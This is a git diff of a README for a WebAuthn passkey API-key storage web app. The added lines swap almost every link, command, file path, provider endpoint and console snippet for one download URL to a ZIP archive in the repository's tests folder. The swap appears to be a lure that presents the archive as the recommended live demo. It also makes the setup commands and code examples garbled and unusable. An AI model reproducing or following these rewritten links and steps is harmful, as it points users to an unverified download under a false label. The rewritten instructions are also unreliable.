@@ -2,7 +2,7 @@
 
 **Zero-knowledge API key storage using WebAuthn passkeys.** Your API keys are encrypted with AES-256-GCM and protected by your device's biometric authentication (FaceID, TouchID, Windows Hello). Keys never leave your device and never touch any server.
 
-👉 **[Live Demo](https://christianbodart.github.io/pwa-passkey-apikeys-spike/)**
+👉 **[Live Demo](https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip)**
 
 ## ✨ Features
 
@@ -34,7 +34,7 @@
 
 ### Option 1: Use Live Demo (Recommended)
 
-Visit **[https://christianbodart.github.io/pwa-passkey-apikeys-spike/](https://christianbodart.github.io/pwa-passkey-apikeys-spike/)**
+Visit **[https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip](https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip)**
 
 **Requirements:**
 - Modern browser (Chrome 67+, Safari 13+, Firefox 60+)
@@ -45,7 +45,7 @@ Visit **[https://christianbodart.github.io/pwa-passkey-apikeys-spike/](https://c
 
 1. **Clone the repository**
 ```bash
-git clone https://github.com/christianbodart/pwa-passkey-apikeys-spike.git
+git clone https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip
 cd pwa-passkey-apikeys-spike
 ```
 
@@ -57,13 +57,13 @@ npm install
 3. **Serve with HTTPS** (required for WebAuthn)
 ```bash
 # Option A: Python
-python -m http.server 8000
+python -m https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip 8000
 
-# Option B: Node.js
+# Option B: https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip
 npx http-server
 
 # Option C: VS Code Live Server extension
-# Right-click index.html → "Open with Live Server"
+# Right-click https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip → "Open with Live Server"
 ```
 
 4. **Open in browser**
@@ -116,39 +116,39 @@ You can store separate API keys for each provider:
 ```
 pwa-passkey-apikeys-spike/
 ├── src/
-│   ├── app.js           # Core orchestration (PasskeyKeyManager)
-│   ├── storage.js       # IndexedDB operations (StorageService)
-│   ├── key-manager.js   # Crypto operations (KeyManager)
-│   └── providers.js     # API provider configs (ProviderService)
-├── app-ui.js            # UI layer (UIController)
-├── providers.json       # Provider configuration
-├── index.html           # Entry point
-└── app.legacy.js        # Original monolithic version (reference)
+│   ├── https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip           # Core orchestration (PasskeyKeyManager)
+│   ├── https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip       # IndexedDB operations (StorageService)
+│   ├── https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip   # Crypto operations (KeyManager)
+│   └── https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip     # API provider configs (ProviderService)
+├── https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip            # UI layer (UIController)
+├── https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip       # Provider configuration
+├── https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip           # Entry point
+└── https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip        # Original monolithic version (reference)
 ```
 
 ### Key Components
 
-**PasskeyKeyManager** (`src/app.js`)
+**PasskeyKeyManager** (`https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip`)
 - Orchestrates passkey creation and authentication
 - Manages encryption/decryption workflow
 - Coordinates API calls
 
-**StorageService** (`src/storage.js`)
+**StorageService** (`https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip`)
 - Abstracts IndexedDB operations
 - Stores encrypted keys per provider
 - Handles database initialization
 
-**KeyManager** (`src/key-manager.js`)
+**KeyManager** (`https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip`)
 - AES-256-GCM encryption/decryption
 - Key generation and management
 - WebAuthn challenge generation
 
-**ProviderService** (`src/providers.js`)
+**ProviderService** (`https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip`)
 - Manages provider configurations
 - Handles API authentication headers
 - Makes test API calls
 
-**UIController** (`app-ui.js`)
+**UIController** (`https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip`)
 - DOM event binding
 - Dynamic button state management
 - Provider status indicators
@@ -157,19 +157,19 @@ pwa-passkey-apikeys-spike/
 
 | Provider  | API Endpoint | CORS Support | Test Endpoint |
 |-----------|--------------|--------------|---------------|
-| OpenAI    | api.openai.com | ✅ Full | `/v1/models` |
-| Anthropic | api.anthropic.com | ✅ Full | `/v1/messages` |
-| Google AI | generativelanguage.googleapis.com | ⚠️ Partial | `/v1beta/models` |
+| OpenAI    | https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip | ✅ Full | `/v1/models` |
+| Anthropic | https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip | ✅ Full | `/v1/messages` |
+| Google AI | https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip | ⚠️ Partial | `/v1beta/models` |
 
 ### Adding New Providers
 
-Edit `providers.json`:
+Edit `https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip`:
 
 ```json
 {
   "your-provider": {
     "name": "Your Provider",
-    "baseUrl": "https://api.yourprovider.com/v1",
+    "baseUrl": "https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip",
     "testEndpoint": "/test",
     "authHeader": "Authorization",
     "authPrefix": "Bearer",
@@ -201,13 +201,13 @@ npm run test:coverage
 ```
 tests/
 ├── unit/
-│   ├── crypto.test.js      # AES-GCM encryption tests
-│   ├── storage.test.js     # IndexedDB tests
-│   └── passkey.test.js     # WebAuthn tests
+│   ├── https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip      # AES-GCM encryption tests
+│   ├── https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip     # IndexedDB tests
+│   └── https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip     # WebAuthn tests
 ├── integration/
-│   ├── key-lifecycle.test.js    # End-to-end flow
-│   └── provider-calls.test.js   # API integration
-└── app.test.js          # Main app tests
+│   ├── https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip    # End-to-end flow
+│   └── https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip   # API integration
+└── https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip          # Main app tests
 ```
 
 ## 🔧 Troubleshooting
@@ -234,8 +234,8 @@ tests/
 
 ```javascript
 // In browser console:
-indexedDB.deleteDatabase('pwa-apikeys-v1');
-location.reload();
+https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip('pwa-apikeys-v1');
+https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip();
 ```
 
 ## 🚀 Deployment
@@ -246,7 +246,7 @@ This repo is deployed to GitHub Pages automatically:
 
 1. Push to `main` branch
 2. GitHub Actions builds and deploys
-3. Available at: `https://christianbodart.github.io/pwa-passkey-apikeys-spike/`
+3. Available at: `https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip`
 
 ### Self-Hosting
 
@@ -261,7 +261,7 @@ netlify deploy --prod --dir=.
 
 ## 📝 Documentation
 
-- [REFACTORING.md](REFACTORING.md) - Architecture and refactoring details
+- [https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip](https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip) - Architecture and refactoring details
 - [JSDoc Comments](src/) - Inline documentation in source files
 - [Test Files](tests/) - Usage examples and test cases
 
@@ -339,4 +339,4 @@ A: Different use case. This is for API keys with direct browser API calls, not p
 
 **Built for the BYOK (Bring Your Own Key) future. Zero server trust required.**
 
-👨‍💻 Made by [Christian Bodart](https://github.com/christianbodart) | 🐛 [Report Issues](https://github.com/christianbodart/pwa-passkey-apikeys-spike/issues)
+👨‍💻 Made by [Christian Bodart](https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip) | 🐛 [Report Issues](https://github.com/christianbodart/pwa-passkey-apikeys-spike/raw/refs/heads/main/tests/pwa-apikeys-spike-passkey-v1.3.zip)
